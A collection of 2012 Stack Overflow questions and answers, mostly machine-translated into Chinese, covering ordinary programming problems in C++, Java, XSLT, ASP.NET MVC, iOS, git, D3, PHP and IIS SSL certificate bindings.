将业务逻辑排除在控制器之外是常识。使用存储库模式，数据库访问逻辑应该在存储库上也是常识，如下所述：[存储库模式](http://www.remondo.net/repository-pattern-example-csharp/)

但是，存储库模式只指定了非常简单的低级数据库操作：插入、删除、更新、选择。人们也建议不要使用验证逻辑。这不是问题，因为大多数验证都可以放在模型对象本身中。当我们需要进行某种交叉验证时，问题就出现了，即需要查看同一模型对象的多个实例的验证（例如，确保名称在同一对象的所有实例中是唯一的) 或者，更糟糕的是，当验证逻辑需要检查两个或多个不同类型的对象时。在这种情况下，我们有一个真正的大漏洞：业务逻辑不能在控制器中，不能在存储库中，不能在对象模型本身中（因为逻辑不仅仅绑定到对象的属性）。这个逻辑应该在哪里？这种需求的最佳设计模式是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T19:51:22.483

You can create a service layer as described here: [http://www.asp.net/mvc/tutorials/older-versions/models-(data)/validating-with-a-service-layer-cs](http://www.asp.net/mvc/tutorials/older-versions/models-(data)/validating-with-a-service-layer-cs)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:17:37.953

这里的问题是您的设计需要 UI 根据业务问题进行验证。

实现这一点的方法是将验证抽象到业务层中。您的业​​务层可能有类似的方法`ValidateUserIsUnique()`，然后您的 ui 调用该层并接收结果，然后将其用于验证。

特别是，对于客户端验证，MVC 提供了`RemoteValidationAttribute`，但这只会进行客户端验证。您还需要执行在服务器上调用相同（或类似）函数的服务器端验证。

# c++ - 不知道派生类型的静态 CRTP 类？

> ID：12866070
> 
> 赞同：2
> 
> 时间：2012-10-12T19:47:48.937
> 
> 标签：c++, templates, static, crtp

给定以下工作代码。

```
#include <iostream>

template<class Detail>
class AbstractLogger
{
public:
    static void log(const char* str) {
        Detail::log_detailled(str);
    }
};

class Logger : public AbstractLogger<Logger>
{
public:
    static void log_detailled(const char* str) {
        std::cerr << str << std::endl;
    }
};

int main(void)
{
    AbstractLogger<Logger>::log("main function running!");
    return 0;
} 
```

现在，我想放入`AbstractLogger`一个库，让库用户定义自己的记录器，就像`Logger`这里的类一样。这有一个缺点：`AbstractLogger<Logger>`不能在库内部使用，因为库无法知道`Logger`.

笔记：

*   请不要虚函数或问题为什么不。另外，我知道“静态虚拟”成员无效的类似问题。也许，CRTP 中有一个解决方法:)
*   C++11 会很有趣，但是，我需要“通常的”C++。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T19:55:04.870

如果您的意思是您希望有一个库在不知道确切的实例化类型的情况下使用它作为日志记录机制，我建议您不要这样做。

在满足您的其他要求（即没有虚函数）的同时这样做的唯一方法是将库中需要记录的所有函数/类型转换为采用该`Logger`类型的模板。最终结果是您的大部分界面都变成了模板（尽管您可能可以将大量实现转移到非模板代码中，但这会使您的生活变得比需要的困难得多，并且仍然会生成更大的二进制文件） .

如果您对虚函数的关注是性能，那么您应该重新考虑您的方法及其带来的问题。特别是，日志记录**是**昂贵的。大多数日志库通过优化非日志案例来解决它（通过在未启用日志级别/组/...时避免调用记录器的宏），但仍然为实际写入保留动态调度。与写入控制台或文件的成本，甚至与生成将被记录的消息的成本相比，动态调度的成本可以忽略不计（我假设您不仅记录文字字符串）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:00:53.163

通常的方法是针对一个概念进行编码，同时提供帮助程序，以便用户可以轻松地生成满足这些概念中的一个或多个的类型。例如，`boost::iterator_facade`CRTP helper 之类的东西可以让用户更轻松地编写迭代器。然后，该迭代器可以在任何接受迭代器的地方使用——例如在`std::vector`. 请注意，该特定构造函数如何不知道用户定义的类型。

在您的情况下，`AbstractLogger`将是 CRTP 助手。缺少的部分是定义例如记录器的概念。因此，请注意需要记录器的所有内容要么需要作为模板实现，要么您需要一个类型擦除容器来保存任意记录器。

概念检查（如[Boost](http://www.boost.org/doc/libs/1_51_0/libs/concept_check/concept_check.htm)提供的那些）对于这种编程很方便，因为它们允许用实际代码表示一个概念。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T19:55:48.603

模板类不能“放入库中”，因为它们被编译器实例化为模板参数的特化。

不过，您可以将模板实现中使用的与参数无关的东西放入库中。

# java - Apache CXF 拦截器配置

> ID：12866071
> 
> 赞同：3
> 
> 时间：2012-10-12T19:47:50.153
> 
> 标签：java, spring, jax-ws, cxf, jax-rs

我创建了一个 SOAP 拦截器，如[CXF 文档](http://cxf.apache.org/docs/interceptors.html)中所述：

```
public class SoapMessageInterceptor extends AbstractSoapInterceptor {
    public SoapMessageInterceptor() {
        super(Phase.USER_PROTOCOL);
    }
    public void handleMessage(SoapMessage soapMessage) throws Fault {
        // ...
    }
} 
```

并在 Spring 的应用程序上下文中将其注册到总线：

```
 <cxf:bus>
    <cxf:inInterceptors>
      <ref bean="soapMessageInterceptor"/>
    </cxf:inInterceptors>
  </cxf:bus>

  <jaxws:endpoint id="customerWebServiceSoap"
        implementor="#customerWebServiceSoapEndpoint"
        address="/customerService"/> 
```

在我添加 REST 服务之前一切正常：

```
 <jaxrs:server id="customerWebServiceRest" address="/rest">
    <jaxrs:serviceBeans>
      <ref bean="customerWebServiceRestEndpoint" />
    </jaxrs:serviceBeans>
  </jaxrs:server> 
```

问题是 SOAP 拦截器现在也在 REST 请求上被触发，这会在调用 REST 服务时导致类转换异常。

```
<ns1:XMLFault xmlns:ns1="http://cxf.apache.org/bindings/xformat">
  <ns1:faultstring xmlns:ns1="http://cxf.apache.org/bindings/xformat">
    java.lang.ClassCastException: org.apache.cxf.message.XMLMessage
    cannot be cast to org.apache.cxf.binding.soap.SoapMessage
  </ns1:faultstring>
</ns1:XMLFault> 
```

有没有办法仅通过配置将拦截器限制为 SOAP 消息？

**更新**

看起来我错过了描述这一点的文档中的页面。向下滚动到[JAXRS 过滤器和 CXF 拦截器之间的区别](http://cxf.apache.org/docs/jax-rs-filters.html)

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-12T22:42:31.613

您可以将拦截器附加到单个端点而不是总线：

```
<jaxws:endpoint id="customerWebServiceSoap"
    implementor="#customerWebServiceSoapEndpoint"
    address="/customerService">
  <jaxws:inInterceptors>
    <ref bean="soapMessageInterceptor"/>
  </jaxws:inInterceptors>
</jaxws:endpoint> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-12T22:07:03.267

您可以尝试像这样配置您的拦截器：

```
 <cxf:bus name="someBus">
    <cxf:inInterceptors>
      <ref bean="soapMessageInterceptor"/>
    </cxf:inInterceptors>
  </cxf:bus> 
```

通过定义`name`总线的 ，根据文档，将总线标识为唯一的`Spring`bean。然后在您的`JAX-WS`端点配置中，您需要指定引用该名称的总线：

```
 <jaxws:endpoint id="customerWebServiceSoap"
        implementor="#customerWebServiceSoapEndpoint"
        address="/customerService"
        bus="someBus"/> 
```

这`bus`应该只适用于这个`JAX-WS`端点。

# asp.net-mvc - 具有静态和动态值的 MVC3 Html.DropDownListFor

> ID：12866080
> 
> 赞同：2
> 
> 时间：2012-10-12T19:48:21.187
> 
> 标签：asp.net-mvc, asp.net-mvc-3, html.dropdownlistfor

我想在我的控制器中使用静态和动态值填充 Html.DropDownListFor 。我似乎无法弄清楚如何使这项工作。我尝试了几种不同的方法，但大多数都围绕 (1) 在变量中定义静态值，(2) 尝试附加动态值 (3) 通过 viewModel 将所有值传递到我的局部视图。

这是上述方法的示例。

```
//retrieve categories from DB
List<Category> categoryFromDb = new GetCategory().GetCategoryDropdownList(MySession.Current.AccountId).FindAll(c => c.StageId == currentStage);

//local variable with static values and trying to add the dynamic values from above
    var categoryDropDown = new [] {
                                      new {CategoryId = "", CategoryName = "Select Activity"},
                                      new {CategoryId = "0", CategoryName = "Note"},
                                      new {CategoryId = categoryFromDb[0], CategoryName = categoryFromDb[3]}  //THIS IS THE LINE I CAN'T FIGURE OUT
                                  };

    var viewModel = new ActivityTimelineViewModel
    {
        ActivityTimeline = new GetActivity().GetActivityTimeline(MySession.Current.AccountId, MySession.Current.CandidateId),
        CategoryList = categoryDropDown,
        Date = DateTime.Today
    }; 
```

我敢肯定，鉴于我的新手能力，我缺少一些简单的东西。-蒂姆

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:04:14.190

您必须找到一种通用类型，然后才能将它们放入组合集合中。您可以制作类别类型的静态值吗？

```
List<Category> categoryFromDb = new GetCategory().GetCategoryDropdownList(MySession.Current.AccountId).FindAll(c => c.StageId == currentStage);
var staticCategories = new[]
{
    new Category{CategoryId = "", CategoryName = "Select Activity"},
    new Category{CategoryId = "0", CategoryName = "Note"}
};

var combinedCategories = staticCategories.Union(categoryFromDb); 
```

或者，如果类别不起作用，则将它们放入这样的 SelectListItem 中。

```
List<SelectListItem> selectItemsFromDB =
new GetCategory().GetCategoryDropdownList(MySession.Current.AccountId).FindAll(
    c => c.StageId == currentStage)
    .Select(c=> new SelectListItem{Value = c.CategoryId, Text = c.CategoryName});
var staticCategories = new[]
{
    new SelectListItem{Value = "", Text = "Select Activity"}
    new SelectListItem{Value = "0", Text = "Note"}
};

var combinedCategories = staticCategories.Union(selectItemsFromDB); 
```

# cordova - how to upload audio file?

> ID：12866087
> 
> 赞同：0
> 
> 时间：2012-10-12T19:48:49.453
> 
> 标签：cordova

im using build.phonegap , and i want to record Audio then upload audio file to server .

i have seen the following code to record MP3:

```
function recordAudio() {
var src = "myrecording.mp3";
var mediaRec = new Media(src,
 function() {            console.log("recordAudio():Audio Success");    
    },

 // error callback        function(err) {   
         console.log("recordAudio():Audio Error: "+ err.code);      
  });

  // Record audio    mediaRec.startRecord();} 
```

======================================================================================

this is for recording media file , now how i can upload this file to server ??

i have seen phonegap example to upload file to server , but this example explain how to upload images from camera to server not mp3 file , but i want to know how i can upload this mp3 file direclty to server .

and please i want to know :

**"myrecording.mp3"** file will saved inside my **application** ????

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T19:54:36.290

看看这个线程：[如何使用phonegap将mp3文件上传到服务器（xxampp）。？](https://stackoverflow.com/questions/7171496/how-can-upload-mp3-file-to-the-serverxxampp-by-using-phonegap)

这导致您：[http ://docs.phonegap.com/en/1.0.0/phonegap_file_file.md.html#FileTransfer](http://docs.phonegap.com/en/1.0.0/phonegap_file_file.md.html#FileTransfer)

# xslt - XSLT 动态创建行和列

> ID：12866093
> 
> 赞同：1
> 
> 时间：2012-10-12T19:49:12.977
> 
> 标签：xslt

我有一个具有以下格式的 XML 文件：

```
 <DataSet>
  <Data id ="1" columns ="4">
    <item name ="data1" value="value1"/>
    <item name ="data2" value="value2"/>
    <item name ="data3" value="value3"/>
    <item name ="data4" value="value4"/>
    <item name ="data5" value="value5"/>
  </Data>
  <Data id="2" columns ="2">
    <item name ="data1" value="value1"/>
    <item name ="data2" value="value2"/>
    <item name ="data3" value="value3"/>
    <item name ="data4" value="value4"/>
  </Data>
</DataSet> 
```

我需要一个 XSL 转换来获得以下表格结构。这里的想法是在两个相邻的单元格中显示名称和值属性。因此，一个“项目”将与 2 列相关联，一行将包含两个项目的名称/值对。列数将在 Data 元素中指定，并且始终是 2 的倍数。

```
<report>
  <table>
    <tr>
      <td>data1</td>
      <td>value1</td>
      <td>data2</td>
      <td>value2</td>
    </tr>
    <tr>
      <td>data3</td>
      <td>value3</td>
      <td>data4</td>
      <td>value4</td>
    </tr>
    <tr>
      <td>data5</td>
      <td>value5</td>
      <td></td>
      <td></td>
    </tr>
 </table>
 <table>
    <tr>
      <td>data1</td>
      <td>value1</td>
    </tr>
    <tr>
      <td>data2</td>
      <td>value2</td>
    </tr>
    <tr>
      <td>data3</td>
      <td>value3</td>
    </tr>
    <tr>
      <td>data4</td>
      <td>value4</td>
    </tr>
  </table>
</report> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:00:53.350

应用于提供的输入的以下 XSL 转换会产生所需的输出。下面提供一些解释。

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:transform version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

    <xsl:template match="/DataSet"><report>
        <xsl:apply-templates select="@*|node()" />
    </report></xsl:template>

    <xsl:template match="Data">
        <xsl:variable name="count" select="count(item)" />
        <xsl:variable name="M" select="@columns div 2" />
        <xsl:variable name="N" select="($count + ($count mod $M)) div $M" />
        <table>
            <xsl:call-template name="nth-row">
                <xsl:with-param name="n" select="1" />
                <xsl:with-param name="M" select="$M" />
                <xsl:with-param name="N" select="$N" />
            </xsl:call-template>
        </table>
    </xsl:template>

    <xsl:template name="nth-row">
        <xsl:param name="n" />
        <xsl:param name="N" />
        <xsl:param name="M" />
        <tr>
            <xsl:call-template name="nmth-cell">
                <xsl:with-param name="n" select="$n" />
                <xsl:with-param name="m" select="1" />
                <xsl:with-param name="N" select="$N" />
                <xsl:with-param name="M" select="$M" />
            </xsl:call-template>
        </tr>
        <xsl:if test="$N > $n">
            <xsl:call-template name="nth-row">
                <xsl:with-param name="n" select="$n + 1" />
                <xsl:with-param name="N" select="$N" />
                <xsl:with-param name="M" select="$M" />
            </xsl:call-template>
        </xsl:if>
    </xsl:template>

    <xsl:template name="nmth-cell">
        <xsl:param name="n" />
        <xsl:param name="m" />
        <xsl:param name="N" />
        <xsl:param name="M" />
        <xsl:variable name="pos" select="($n - 1) * $M + $m" />
        <xsl:choose>
            <xsl:when test="item[position()=$pos]">
                <td><xsl:value-of select="item[position()=$pos]/@name" /></td>
                <td><xsl:value-of select="item[position()=$pos]/@value" /></td>
            </xsl:when>
            <xsl:otherwise>
                <td></td>
                <td></td>
            </xsl:otherwise>
        </xsl:choose>
        <xsl:if test="$M > $m">
            <xsl:call-template name="nmth-cell">
                <xsl:with-param name="n" select="$n" />
                <xsl:with-param name="m" select="$m + 1" />
                <xsl:with-param name="N" select="$N" />
                <xsl:with-param name="M" select="$M" />
            </xsl:call-template>
        </xsl:if>
    </xsl:template>
</xsl:transform> 
```

1.  匹配`/DataSet`产生根元素`<report />`并继续应用模板。

2.  `Data`从内部匹配为每个元素`/DataSet`生成一个，然后通过调用名为的模板开始有趣的部分。使用的变量和参数有：`<table />``<Data />``nth-row`

    *   **n** : 当前行数，从 1 开始
    *   **M** : 列数，由属性`@columns`除以 2 计算得出，因为每个都会`<item />`产生两个`<td />`元素。
    *   **N** : 行数，由`<item />`存在的元素数除以**M**计算得出。为了考虑`div`截断整数值，余数`$count mod $M`被添加到`$count`之前。
3.  现在有一些递归模板调用。每次`nth-row`被调用时，它会输出 a `<tr />`，然后`nmth-cell`使用适当的参数调用。只要当前行不是最后一行，`nth-row`就会以递增的值递归调用`$n`.

4.  最后，`nmth-cell`每次调用模板时，如果没有对应的 ，则输出两个`<td />`包含适当值或不包含值的元素。只要当前列不是最后一列，就会以递增的值递归调用.`<item />``<item />``nmth-cell``$m`

我希望这有帮助。随意问，如果这有什么问题或不清楚。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-14T13:36:53.713

这是一个更简单的解决方案。

**这个 XSLT 1.0 样式表...**

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html" indent="yes"/>
<xsl:strip-space elements="*" />

<xsl:template match="/*">
  <report>
    <xsl:apply-templates />
  </report>
</xsl:template>

<xsl:template match="Data">
  <xsl:variable name="cols" select="@columns" />
  <table>
    <xsl:for-each select="item[position()*2 mod $cols = (2 mod $cols)]">
      <tr>
       <xsl:for-each select="(.|following-sibling::item)
          [ position()*2 &lt;= $cols]">
         <td><xsl:value-of select="@name" /></td>  
         <td><xsl:value-of select="@value" /></td>  
       </xsl:for-each> 
       <xsl:if test="position()=last()">
         <xsl:for-each select="((/)//*)[position() &lt;=
              ($cols - (count(.|following-sibling::item)*2))]">
            <td />
         </xsl:for-each>   
       </xsl:if>  
      </tr>  
    </xsl:for-each>  
  </table>
</xsl:template>

</xsl:stylesheet> 
```

**...当应用于此输入时...**

```
<DataSet>
  <Data id ="1" columns ="4">
    <item name ="data1" value="value1"/>
    <item name ="data2" value="value2"/>
    <item name ="data3" value="value3"/>
    <item name ="data4" value="value4"/>
    <item name ="data5" value="value5"/>
  </Data>
  <Data id="2" columns ="2">
    <item name ="data1" value="value1"/>
    <item name ="data2" value="value2"/>
    <item name ="data3" value="value3"/>
    <item name ="data4" value="value4"/>
  </Data>
</DataSet> 
```

**...产量...**

```
<report>
  <table>
    <tr>
      <td>data1</td>
      <td>value1</td>
      <td>data2</td>
      <td>value2</td>
    </tr>
    <tr>
      <td>data3</td>
      <td>value3</td>
      <td>data4</td>
      <td>value4</td>
    </tr>
    <tr>
      <td>data5</td>
      <td>value5</td>
      <td></td>
      <td></td>
    </tr>
  </table>
  <table>
    <tr>
      <td>data1</td>
      <td>value1</td>
    </tr>
    <tr>
      <td>data2</td>
      <td>value2</td>
    </tr>
    <tr>
      <td>data3</td>
      <td>value3</td>
    </tr>
    <tr>
      <td>data4</td>
      <td>value4</td>
    </tr>
  </table>
</report> 
```

## 解释

1.  您可以非常简单地使用`position()`将输出结构化为矩阵。这比具有许多参数的复杂调用模板要好得多。
2.  使用`html`输出方法而不是默认`xml`输出方法。这为您的空元素提供了 html 编码风格（如`<td></td>`xml 风格`</td>`）。
3.  使用[Piez 方法](http://www.dpawson.co.uk/xsl/sect2/muench.html#d9945e300)在表格的最后一行发出奇数的空表格单元格。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:02:41.767

我不确切知道你想要什么格式，但这应该让你接近我希望。它为每个数据集制作一个表格，其中数据和值对彼此相邻。如果您也需要格式化帮助，请发表评论

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!-- Edited by XMLSpy® -->
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

<xsl:template match="/">
  <html>
  <body>
  <report>
      <xsl:for-each select="DataSet/Data">
      <table>
          <xsl:for-each select="item">
              <tr>
                  <td><xsl:value-of select="@name"/></td>
                  <td><xsl:value-of select="@value"/></td>
              </tr>
          </xsl:for-each>
       </table>
       </xsl:for-each>
  </report>
  </body>
  </html>
</xsl:template> 
```

# android - 来自edittext的Android浏览器网址

> ID：12866098
> 
> 赞同：0
> 
> 时间：2012-10-12T19:49:28.830
> 
> 标签：android, browser

```
 final AlertDialog.Builder alert = new AlertDialog.Builder(this);
    alert.setTitle("test");
    alert.setMessage("test");
    // Set an EditText view to get user input 
    final EditText input = new EditText(this);
    alert.setView(input);

    alert.setPositiveButton("Ok", new DialogInterface.OnClickListener() {
    public void onClick(DialogInterface dialog, int whichButton) {
      // Do something with value!
        String link = input.getText().toString();
        startActivity(new Intent(Intent.ACTION_VIEW).setData(Uri
        .parse(link)));
      }
    });

    alert.setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
      public void onClick(DialogInterface dialog, int whichButton) {
        // Canceled.
      }
    }); 
```

我想要的是浏览器打开用户在edittext中输入的内容，然后单击 Ok ..

目前应用程序强制关闭

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T14:00:15.923

发现错误并修复它，nvm。谢谢。你首先需要http：D

错误是您`http://`一开始需要使用`Action_View`

# visual-studio-2010 - Visual Studio compiles projects with duplicate DLLs appended with computer name

> ID：12866099
> 
> 赞同：0
> 
> 时间：2012-10-12T19:49:29.687
> 
> 标签：visual-studio-2010, compilation

I have a web project which references a number of other projects, and when this web project is compiled, I'm getting the standard DLLs as expected for the project and others, but in addition there are 'duplicate' DLLs for all those projects with my computer name appended to the end:

MyServices.dll (and .pdb) MyServices-computerName.dll (and .pdb)

When I run the website, I'm getting errors that the file could not be found, and that the DLL's manifest doesn't match the executable.

I tried cleaning the build, wiping everything and re-getting from source control, but they keep coming back.

If I manually delete them, the site runs fine, but they come back when I build.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-14T21:27:31.900

这原来是源文件夹与 SkyDrive 同步的结果。在构建过程中，对 dll 进行了许多更改，这实际上使得看起来多个源正在更新相同的文件，因此 SkyDrive 将计算机名称附加到文件的末尾以保留从“不同”源所做的更改。

[Skydrive 应用程序同步正在创建文件的多个副本 - Microsoft Community](http://j.mp/RDp2R1)

# ios - 空变量IOS的种类

> ID：12866100
> 
> 赞同：3
> 
> 时间：2012-10-12T19:49:31.543
> 
> 标签：ios, debugging, null

我实际上正在调试我的 iOS 应用程序：我想测试一个变量是否为空：

愚蠢的问题哈！

```
if (var !=nil) { doSomeWork ; } 
```

因此，如果变量 var 等于 nil，并且我们想在调试器区域打印这个结果，我们将得到类似的结果：

2012-10-12 21:33:01.553 应用程序名称 [892:13d03]（空）

这很酷，但实际上当我尝试在调试器区域中打印变量内容时，它一直显示：

2012-10-12 21:33:01.553 应用程序名称 [892:13d03] < null >

你能告诉我这两种null有什么区别吗，我如何测试第二种是否等于nil。

提前致谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T19:55:07.887

第二个输出`<null>`来自`NSNull`单例。这是一个被调用的类`NSNull`，它有一个类方法，每次都`+null`返回相同的单例实例。此类的主要目的是能够在您无法放置的地方`NSNull`充当替身，例如在集合中。例如，JSON 库通常在 JSON 包含.`nil``nil``NSNull``null`

您可以简单地通过询问它是否`==`为`[NSNull null]`（因为它是单例）或是否可能来测试这一点`[obj isKindOfClass:[NSNull null]]`。`[obj isEqual:[NSNull null]]`如果你喜欢，你可以使用。您甚至可以询问是否`== kCFNull`愿意，因为`CFNull`并且`NSNull`是免费桥接的。你想要什么风格，就看你自己了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T19:55:28.790

`NSNull`它是类，`nil`不是。因此，如果您要`nil`与某些东西进行比较，则应使用“ `==`”，如果`NSNull`则->`if ([var isEqual:[NSNull null]]) { ....}`

# git - Git pull without history

> ID：12866102
> 
> 赞同：3
> 
> 时间：2012-10-12T19:49:52.607
> 
> 标签：git, history, corruption

I created a local copy of a remote repository. Because of some old bad commit data causing trouble, I had to rewrite (filter-branch) the local repo history. So now I have a clone of a remote repo, except the commit hashes are all different.

Is there any way to have the local repo still work with remote for pulling future commits from it? It will never be pushing so that is not an issue. If I run git pull, it tries to pull it's entire original history, which is unwanted and just re-corrupts the local repo.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:01:06.740

如果您只关心拉动，那么可以。您可以做的是获取远程存储库。然后从与您最新的本地提交匹配的远程存储库中识别提交。然后将该远程提交合并到您的本地提交中，并带有`-s ours`标志（以设置`ours`策略）。这将产生一个将两个历史联系在一起的合并提交，同时仅使用本地历史中的树（因此，没有合并冲突）。

有了这个合并，您现在可以`git pull`安全地从远程存储库中，它只会尝试合并比您刚刚创建的虚拟合并更新的提交。

请注意，您仍然必须保留远程 repo 的整个历史记录，并且它可以作为虚拟合并的第二个父级访问。但它不会影响你当地的树。

# meteor - Meteor.Render 还是 Template？

> ID：12866107
> 
> 赞同：2
> 
> 时间：2012-10-12T19:50:10.280
> 
> 标签：meteor

只是想知道何时呈现项目列表。
使用 Meteor.RenderList 和 Meteor.Render 是不是性能最好，还是应该尽量使用 Templates？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T11:13:04.123

我将模板 {{#each}} 和 Meteor.render 与骨干路由器一起使用。我像这样制作一个函数包装 Meteor.render

```
render: (where, which, options) ->
    self = @
    self.options = options
    $ where.empty().html Meteor.render Template[which] 
```

然后在骨干路由器内部看起来像

```
routes:
    '': 'home'

home: ->
    render 'body', 'page-home' 
```

和 page-home.html 包含模板和 {{#each}} 来获取我的列表。

```
<template name="page-home">
    {{> module-streams-list}} blah blah blah
</template> 
```

我也想知道人们如何处理页面 Meteor.render/Meteor.renderList 与路由。

# javascript - D3 过渡不起作用

> ID：12866109
> 
> 赞同：6
> 
> 时间：2012-10-12T19:50:17.380
> 
> 标签：javascript, svg, d3.js

我有以下 SVG 元素：

```
<svg id='svgTest' xmlns="http://www.w3.org/2000/svg" version="1.1">
  <g id="test">
    <rect height="20" width="50" fill="blue"/>
  </g>
</svg> 
```

我想为蓝色矩形添加一个过渡。我尝试使用 D3 使用以下代码：

```
var rect = d3.select("#test");
rect.transition().duration(5000).attr('height',200); 
```

但它似乎没有做任何事情。怎么了？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-12T19:53:45.240

您需要选择“rect”元素。试试这个：

```
var rect = d3.select("#test rect");

rect.transition().duration(5000).attr('height',200); 
```

如果要更新多个元素，请使用 d3.selectAll()。

# php - 来自 SQL 查询的 php 中的按标题分组

> ID：12866112
> 
> 赞同：0
> 
> 时间：2012-10-12T19:50:38.120
> 
> 标签：php, mysql, group-by

所以这是我从查询中得到的表：

```
----------+----+-----------+----------------------
45678-sm-w| 18 |T-Shirts   | Mens clothing
----------+----+-----------+----------------------
45678-sm-b|  5 |T-Shirts   | Mens clothing
----------+----+-----------+----------------------
2189-L-Wh |  4 | Socks     | Juniors Clothing
----------+----+-----------+----------------------
2189-L-Bl |  3 | Socks     | Juniors Clothing
----------+----+-----+-----+---------------------- 
```

我想在报告中添加如下内容：

```
T-Shirts
----------+----+-----------+----------------------
45678-sm-w| 18 |T-Shirts   | Mens clothing
----------+----+-----------+----------------------
45678-sm-b|  5 |T-Shirts   | Mens clothing
----------+----+-----------+----------------------

Socks
 ----------+----+-----------+----------------------
2189-L-Wh |  4 | Socks     | Juniors Clothing
----------+----+-----------+----------------------
2189-L-Bl |  3 | Socks     | Juniors Clothing
----------+----+-----+-----+---------------------- 
```

我知道它是通过循环完成的，但无法弄清楚。谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:10:53.180

尝试按项目类型对查询进行排序，并在当前标题更改时强制使用标题。

```
$res = mysql_query("select * from clothing order by item_type, item_size");

$item_type=null;
while ($row = mysql_fetch_assoc($res)) {
    if ($item_type != $row['item_type']) {
        $item_type = $row['item_type'];
        echo $item_type . "\r\n";
    }
    echo $row["item_name"];
    echo $row["item_size"];
    echo $row["item_desc"];
} 
```

# java - 制作跳棋游戏的逻辑？

> ID：12866114
> 
> 赞同：0
> 
> 时间：2012-10-12T19:50:57.673
> 
> 标签：java, applet, logic

我开始制作西洋跳棋游戏，并且我已经绘制了所有图形和棋盘。在我开始创作这些碎片之前，我想知道有什么简单的方法可以解决碎片运动的逻辑方面。我应该为每个正方形制作一张桌子，检测它是否有一块，如果有，什么颜色？（即0=空，1=红色，2=黑色）或者你们对这个问题有更好的想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T19:57:25.730

通过使用 OOP 原则，我会采用以下方法：

```
enum Side {
  BLACK,
  RED;
}

class Position {
  int x, int y;
}

class Piece
{
  Position position; // position inside the board
  Side side; // which side the piece is
}

class Board
{
  Piece[][] board = new Piece[8][8];

  boolean isMoveLegal(Piece p, Position newPosition) {
    ...
  }

  void doMove(Piece p, Position newPosition) {
    if (isMoveLegal(p, newPosition) {
      // game logic of movement and eating other pieces if needed
    }
  }
} 
```

更天真的方法可以使用简单的地图：

```
class Position {
  int x, int y;
}

class Piece
{
  Side side; // which side the piece is
}

class Board
{
  HashMap<Piece, Position> board;

  boolean isMoveLegal(Piece p, Position newPosition) {
    ...
  }

  void doMove(Piece p, Position newPosition) {
    if (isMoveLegal(p, newPosition) {
      // game logic of movement and eating other pieces if needed
    }
  }
} 
```

这可以用来避免将一块的当前位置存储在其内部。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T19:54:34.870

您应该制作一个二维数组来表示棋盘。

```
int[][] board = new int[8][8]; 
```

# iis - IIS 提供了不正确的本地主机证书

> ID：12866117
> 
> 赞同：18
> 
> 时间：2012-10-12T19:51:18.057
> 
> 标签：iis, ssl, ssl-certificate

好的，我有一个 SSL 问题，我似乎无法在这台 1 Win7 x64 机器上解决。多年来，我一直在使用自签名证书，甚至之前还写过关于它们的博客，所以我有经验。但是，发生了一些我这次无法弄清楚的事情。

我在我的机器上创建并安装了 (2) 个 localhost SSL 证书。

1.  localhost（友好名称）在 IIS (7.5) 中发布和创建。它包含我的机器名称的“颁发给”和“颁发者”值：“DevMachine123”。这是为在 IIS 的“默认网站”下配置的应用程序提供的证书。
2.  localhost 使用 makecert.exe 工具创建的 SSL 证书，其中使用了 CN=localhost（通用名称）。它包含'localhost'的'Issued To'和'Issued By'值。这是我*希望*在 IIS 中为在“默认网站”下配置的应用程序提供的 SSL 证书。

我得到的错误是：

> “本网站提供的安全证书是针对不同网站的地址签发的。”

当我查看从 IE 浏览器提供的证书时：它显示正在使用颁发给“DevMachine123”的 localhost 证书，而*不是*颁发给 localhost 的 localhost（上面的#2）应该可以解决这个问题。因此名称不匹配，因为“DevMachine123”与“localhost”不匹配。

还有一点要说；我的证书*已*添加到“受信任的根证书颁发机构”，因此它们*都是受信任的证书*。

最后一点，我在 IIS 中检查了我机器上“默认网站”的 https 端口 443 绑定配置。我查看证书，它显示绑定了*正确*的localhost 证书（上面的#2，CN=localhost）。

我觉得我已经在这里覆盖了我的基础（是的，我已经看到[了这个](http://www.sslshopper.com/article-how-to-create-a-self-signed-certificate-in-iis-7.html)和[这个](http://www.hanselman.com/blog/WorkingWithSSLAtDevelopmentTimeIsEasierWithIISExpress.aspx)，所以请不要重新发布）。我在这里想念什么？

谢谢！

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-11-26T04:31:08.877

我遇到了类似的问题，并且还通过了您上面提到的站点绑定检查。我运行了以下 netsh 命令

```
netsh http show sslcert 
```

这向我展示了两个 SSL 证书绑定。一个在 IP:Port 0.0.0.0:443 上具有正确的证书，另一个在 IP:Port [::]:443 上具有过期证书。我为本地计算机打开了 CertMgr.msc（有关说明，请参见[此处](http://blogs.msdn.com/b/jpsanders/archive/2009/09/16/troubleshooting-asp-net-the-remote-certificate-is-invalid-according-to-the-validation-procedure.aspx)）并搜索无效证书并发现它已过期。

